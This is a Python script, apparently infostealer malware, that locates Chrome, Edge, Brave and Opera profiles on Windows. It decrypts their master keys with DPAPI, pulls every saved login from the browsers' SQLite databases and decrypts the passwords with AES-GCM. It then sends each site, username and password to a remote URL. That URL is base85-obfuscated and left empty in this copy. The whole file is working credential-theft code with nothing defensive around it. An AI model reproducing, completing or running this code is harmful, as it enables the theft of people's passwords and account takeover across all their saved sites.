import os
import json
import base64
import sqlite3
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import requests # dependency

user = os.getlogin()


def get_search():
    s = [rf"C:\Users\{user}\AppData\Local\Microsoft\Edge", rf"C:\Users\{user}\AppData\Local\Google\Chrome", rf"C:\Users\{user}\AppData\Local\BraveSoftware\Brave-Browser", rf"C:\Users\{user}\AppData\Roaming\Opera Software\Opera Stable"]
    ma = []
    for j in range(len(s)):
        if os.path.isdir(s[j]):
            ma.append(rf"{s[j]}")
        else:
            print(f"no dir {s[j]} found")
    return ma
    

def send_data(a):
    url = b''
    payload = {
        "content":a
        }

    result = requests.post(base64.b85decode(url), json=payload)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print(f"Payload delivered successfully, code {result.status_code}.")

def get_master_key(a):
    with open(a, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(encrypted_password, master_key):
    try:
        iv = encrypted_password[3:15]  
        payload = encrypted_password[15:]  
        ciphertext = payload[:-16]  
        tag = payload[-16:]  

       
        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(ciphertext) + decryptor.finalize()

        return decrypted_password.decode("utf-8")
    except Exception as e:
        print(f"Decryption failed: {e}")
        return None

def get_goog():
    conn = sqlite3.connect(rf"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    master_key = get_master_key(rf"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State")
    for origin_url, username, encrypted_password in cursor.fetchall():
        if encrypted_password:
            encrypted_password = bytes(encrypted_password)  
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}")
            a= f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}"
            send_data(a)
                    

    conn.close()

    for i in range(1,10):
        try :
            conn = sqlite3.connect(rf"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\profile {i}\Login Data")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            master_key = get_master_key(rf"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State")
            for origin_url, username, encrypted_password in cursor.fetchall():
                if encrypted_password:
                    encrypted_password = bytes(encrypted_password)  
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    print(f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}")
                    a= f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}"
                    send_data(a)
            conn.close()
        except:
            print(f"no folder 'profile {i}' found")

def return_pass(sa):
    for path in sa:
        if path == rf"C:\Users\{user}\AppData\Local\Google\Chrome":
            get_goog()

        elif path == rf"C:\Users\{user}\AppData\Roaming\Opera Software\Opera Stable":
            print(rf"from {path} >>>>>>>>>>>>>>>>")
            conn = sqlite3.connect(rf"{path}\Default\Login Data")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            master_key = get_master_key(rf"{path}\Local State")
            for origin_url, username, encrypted_password in cursor.fetchall():
                if encrypted_password:
                    encrypted_password = bytes(encrypted_password)  
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    print(f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}")
                    a= f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}"
                    send_data(a)

        else:
            print(rf"from {path} >>>>>>>>>>>>>>>>")
            conn = sqlite3.connect(rf"{path}\User Data\Default\Login Data")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            master_key = get_master_key(rf"{path}\User Data\Local State")
            for origin_url, username, encrypted_password in cursor.fetchall():
                if encrypted_password:
                    encrypted_password = bytes(encrypted_password)  
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    print(f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}")
                    a= f"Site: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}"
                    send_data(a)
                    


return_pass(get_search())
